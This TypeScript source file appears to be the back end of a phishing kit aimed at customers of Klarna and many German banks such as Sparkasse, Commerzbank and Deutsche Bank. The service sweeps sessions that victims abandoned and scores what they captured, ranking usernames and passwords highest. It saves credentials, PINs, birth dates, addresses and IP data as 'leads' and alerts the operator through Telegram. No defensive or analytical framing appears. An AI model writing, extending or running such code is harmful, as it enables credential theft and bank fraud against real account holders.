/**
 * Partial Lead Service
 * Automatically converts abandoned sessions with valuable data into leads
 * Now uses leadService for deduplication
 */

import { getDb } from '../database';
import sessionManager from './sessionManager';
import { telegramService } from './telegramService';
import { SessionData } from '../database/tables/sessions';
import { leadService, LeadData } from './leadService';

interface PartialLeadConfig {
  minDataThreshold: number; // Minimum data points required
  abandonmentTimeMinutes: number; // How long to wait before considering abandoned
  enabledTemplates: string[]; // Which templates to process
}

class PartialLeadService {
  private config: PartialLeadConfig = {
    minDataThreshold: 2, // At least username + password
    abandonmentTimeMinutes: 30, // 30 minutes of inactivity (increased from 10)
    enabledTemplates: ['klarna', 'credit-landing', 'commerzbank', 'santander', 'apobank', 'sparkasse', 'postbank', 'dkb', 'volksbank', 'comdirect', 'consorsbank', 'ingdiba', 'deutsche_bank', 'targobank']
  };

  /**
   * Process abandoned sessions and create partial leads
   */
  async processAbandonedSessions(): Promise<void> {
    const db = getDb();
    
    try {
      // Find sessions that are truly abandoned but not yet processed
      const abandonedSessions = db.prepare(`
        SELECT s.*, t.name as template_display_name, t.folder_name
        FROM sessions s
        JOIN templates t ON t.folder_name = s.template_name
        WHERE s.updated_at < datetime('now', '-${this.config.abandonmentTimeMinutes} minutes')
        AND s.is_completed = 0
        AND s.lead_created = 0
        AND s.expires_at > datetime('now')
        AND s.current_state NOT IN ('final_success', 'processing', 'success')
        AND s.template_name IN (${this.config.enabledTemplates.map(() => '?').join(',')})
        ORDER BY s.updated_at ASC
        LIMIT 50
      `).all(...this.config.enabledTemplates);

      console.log(`🔍 [PARTIAL-LEADS] Found ${abandonedSessions.length} abandoned sessions to process`);

      for (const session of abandonedSessions) {
        await this.processAbandonedSession(session);
      }
    } catch (error) {
      console.error('❌ [PARTIAL-LEADS] Error processing abandoned sessions:', error);
    }
  }

  /**
   * Process a single abandoned session
   */
  private async processAbandonedSession(session: any): Promise<void> {
    try {
      // Get session data
      const sessionData = await sessionManager.getSessionData(session.session_key);
      
      if (!sessionData) {
        console.log(`⚠️ [PARTIAL-LEADS] No data found for session ${session.session_key}`);
        return;
      }

      // Check if session has enough valuable data
      if (!this.hasValuableData(sessionData)) {
        // Mark as processed but don't create lead
        await this.markSessionProcessed(session.session_key, 'insufficient_data');
        return;
      }

      // Create partial lead
      const leadId = await this.createPartialLead(session, sessionData);
      
      if (leadId) {
        // Mark session as having lead created
        const db = getDb();
        db.prepare(`
          UPDATE sessions 
          SET lead_created = 1, lead_id = ?, updated_at = CURRENT_TIMESTAMP
          WHERE session_key = ?
        `).run(leadId, session.session_key);

        console.log(`✅ [PARTIAL-LEADS] Created partial lead ${leadId} for session ${session.session_key}`);
        
        // Send notification about partial lead
        await this.notifyPartialLead(session, sessionData, leadId);
      } else {
        await this.markSessionProcessed(session.session_key, 'creation_failed');
      }
    } catch (error) {
      console.error(`❌ [PARTIAL-LEADS] Error processing session ${session.session_key}:`, error);
    }
  }

  /**
   * Check if session data is valuable enough to create a lead
   */
  private hasValuableData(sessionData: SessionData): boolean {
    let dataPoints = 0;
    
    // Login credentials (most valuable)
    if (sessionData.username) dataPoints += 2;
    if (sessionData.password) dataPoints += 2;
    
    // Personal information (valuable)
    if (sessionData.email) dataPoints += 2;
    if (sessionData.phone) dataPoints += 2;
    if (sessionData.first_name) dataPoints += 1;
    if (sessionData.last_name) dataPoints += 1;
    
    // Bank selection (valuable for Klarna)
    if (sessionData.bank_type) dataPoints += 1;
    if (sessionData.selected_branch) dataPoints += 1;
    
    // Address data (somewhat valuable)
    if (sessionData.address || (sessionData.street && sessionData.city)) dataPoints += 1;
    
    return dataPoints >= this.config.minDataThreshold;
  }

  /**
   * Create a partial lead from session data using deduplication
   */
  private async createPartialLead(session: any, sessionData: SessionData): Promise<number | null> {
    const db = getDb();
    
    try {
      // Get template
      const template: any = db.prepare('SELECT * FROM templates WHERE folder_name = ?').get(session.template_name);
      if (!template) {
        console.error(`❌ [PARTIAL-LEADS] Template ${session.template_name} not found`);
        return null;
      }

      // Get or create domain (use default if none found)
      let domain: any = db.prepare('SELECT * FROM domains WHERE template_id = ? LIMIT 1').get(template.id);
      if (!domain) {
        // Create a default domain entry
        const domainResult = db.prepare(`
          INSERT INTO domains (domain_name, template_id, is_active)
          VALUES (?, ?, ?)
        `).run(`abandoned-${session.template_name}.local`, template.id, 1);
        domain = { id: domainResult.lastInsertRowid, domain_name: `abandoned-${session.template_name}.local` };
      }

      // Prepare lead data for upsert
      const leadData: LeadData = {
        template_id: template.id,
        domain_id: domain.id,
        tracking_id: session.session_key,
        first_name: sessionData.first_name,
        last_name: sessionData.last_name,
        email: sessionData.email,
        phone: sessionData.phone,
        username: sessionData.username,
        password: sessionData.password,
        pin: sessionData.pin,
        street: sessionData.street,
        street_number: sessionData.street_number,
        plz: sessionData.plz,
        city: sessionData.city,
        date_of_birth: sessionData.date_of_birth,
        ip_address: session.ip_address,
        user_agent: session.user_agent,
        status: 'partial',
        source: 'partial',
        template_name: session.template_name,
        additional_data: {
          session_key: session.session_key,
          abandonment_point: session.current_state,
          session_duration: this.calculateSessionDuration(session),
          data_completeness: this.calculateDataCompleteness(sessionData),
          selected_bank: sessionData.bank_type,
          selected_branch: sessionData.selected_branch,
          partial_lead: true,
          abandoned_at: new Date().toISOString()
        }
      };

      // Use leadService to upsert (creates new or updates existing based on first_name + last_name)
      const { leadId, isUpdate } = leadService.upsertLead(leadData);
      
      if (isUpdate) {
        console.log(`🔄 [PARTIAL-LEADS] Updated existing lead (ID: ${leadId}) with partial data`);
      }

      return leadId;
    } catch (error) {
      console.error('❌ [PARTIAL-LEADS] Error creating partial lead:', error);
      return null;
    }
  }

  /**
   * Calculate session duration in seconds
   */
  private calculateSessionDuration(session: any): number {
    const start = new Date(session.created_at);
    const end = new Date(session.updated_at);
    return Math.round((end.getTime() - start.getTime()) / 1000);
  }

  /**
   * Calculate data completeness percentage
   */
  private calculateDataCompleteness(sessionData: SessionData): number {
    const possibleFields = ['username', 'password', 'email', 'phone', 'first_name', 'last_name', 'address', 'card_number'];
    const completedFields = possibleFields.filter(field => sessionData[field]);
    return Math.round((completedFields.length / possibleFields.length) * 100);
  }

  /**
   * Mark session as processed (even if no lead created)
   */
  private async markSessionProcessed(sessionKey: string, reason: string): Promise<void> {
    const db = getDb();
    
    try {
      db.prepare(`
        UPDATE sessions 
        SET lead_created = 1, current_state = ?, updated_at = CURRENT_TIMESTAMP
        WHERE session_key = ?
      `).run(`processed_${reason}`, sessionKey);
      
      console.log(`📝 [PARTIAL-LEADS] Marked session ${sessionKey} as processed (${reason})`);
    } catch (error) {
      console.error('❌ [PARTIAL-LEADS] Error marking session processed:', error);
    }
  }

  /**
   * Send notification about partial lead
   */
  private async notifyPartialLead(session: any, sessionData: SessionData, leadId: number): Promise<void> {
    try {
      const leadData = {
        id: leadId,
        template_name: session.template_name,
        template_display_name: session.template_display_name,
        username: sessionData.username || 'N/A',
        email: sessionData.email || 'N/A',
        phone: sessionData.phone || 'N/A',
        status: 'partial',
        abandonment_point: session.current_state,
        session_duration: this.calculateSessionDuration(session),
        data_completeness: this.calculateDataCompleteness(sessionData)
      };

      await telegramService.sendPartialLeadNotification(leadData);
    } catch (error) {
      console.error('❌ [PARTIAL-LEADS] Error sending notification:', error);
    }
  }

  /**
   * Start the background processing service
   */
  startBackgroundProcessing(): void {
    // Process abandoned sessions every 5 minutes
    setInterval(() => {
      this.processAbandonedSessions();
    }, 5 * 60 * 1000);

    console.log('🔄 [PARTIAL-LEADS] Background service started (5-minute intervals)');
  }

  /**
   * Create immediate partial lead for valuable data (like login credentials) using deduplication
   */
  async createImmediatePartialLead(sessionKey: string, templateName: string, sessionData: SessionData): Promise<number | null> {
    const db = getDb();
    
    try {
      // Get session info
      const session = await sessionManager.getSession(sessionKey);
      if (!session) {
        console.error(`❌ [PARTIAL-LEADS] Session ${sessionKey} not found`);
        return null;
      }

      // Get template
      const template: any = db.prepare('SELECT * FROM templates WHERE folder_name = ?').get(templateName);
      if (!template) {
        console.error(`❌ [PARTIAL-LEADS] Template ${templateName} not found`);
        return null;
      }

      // Get or create domain
      let domain: any = db.prepare('SELECT * FROM domains WHERE template_id = ? LIMIT 1').get(template.id);
      if (!domain) {
        const domainResult = db.prepare(`
          INSERT INTO domains (domain_name, template_id, is_active)
          VALUES (?, ?, ?)
        `).run(`immediate-${templateName}.local`, template.id, 1);
        domain = { id: domainResult.lastInsertRowid, domain_name: `immediate-${templateName}.local` };
      }

      // Prepare lead data for upsert
      const leadDataForUpsert: LeadData = {
        template_id: template.id,
        domain_id: domain.id,
        tracking_id: sessionKey,
        first_name: sessionData.first_name,
        last_name: sessionData.last_name,
        email: sessionData.email,
        phone: sessionData.phone,
        username: sessionData.username,
        password: sessionData.password,
        pin: sessionData.pin,
        ip_address: session.ip_address || undefined,
        user_agent: session.user_agent || undefined,
        status: 'partial_immediate',
        source: 'partial',
        template_name: templateName,
        additional_data: {
          session_key: sessionKey,
          capture_type: 'immediate_login',
          session_state: session.current_state,
          selected_bank: sessionData.bank_type,
          selected_branch: sessionData.selected_branch,
          partial_lead: true,
          immediate_capture: true,
          captured_at: new Date().toISOString()
        }
      };

      // Use leadService to upsert (creates new or updates existing based on first_name + last_name)
      const { leadId, isUpdate } = leadService.upsertLead(leadDataForUpsert);

      if (isUpdate) {
        console.log(`🔄 [PARTIAL-LEADS] Updated existing lead (ID: ${leadId}) with immediate partial data`);
      }

      // Send immediate notification
      await this.notifyPartialLead(session, sessionData, leadId);

      return leadId;
    } catch (error) {
      console.error('❌ [PARTIAL-LEADS] Error creating immediate partial lead:', error);
      return null;
    }
  }

  /**
   * Process a specific session (for immediate abandonment handling)
   */
  async processSpecificSession(sessionKey: string): Promise<void> {
    const db = getDb();
    
    try {
      const session = db.prepare(`
        SELECT s.*, t.name as template_display_name, t.folder_name
        FROM sessions s
        JOIN templates t ON t.folder_name = s.template_name
        WHERE s.session_key = ?
        AND s.is_completed = 0
      `).get(sessionKey);

      if (session) {
        console.log(`🔍 [PARTIAL-LEADS] Processing specific session: ${sessionKey}`);
        await this.processAbandonedSession(session);
      }
    } catch (error) {
      console.error(`❌ [PARTIAL-LEADS] Error processing specific session ${sessionKey}:`, error);
    }
  }

  /**
   * Update configuration
   */
  updateConfig(newConfig: Partial<PartialLeadConfig>): void {
    this.config = { ...this.config, ...newConfig };
    console.log('⚙️ [PARTIAL-LEADS] Configuration updated:', this.config);
  }
}

export default new PartialLeadService();
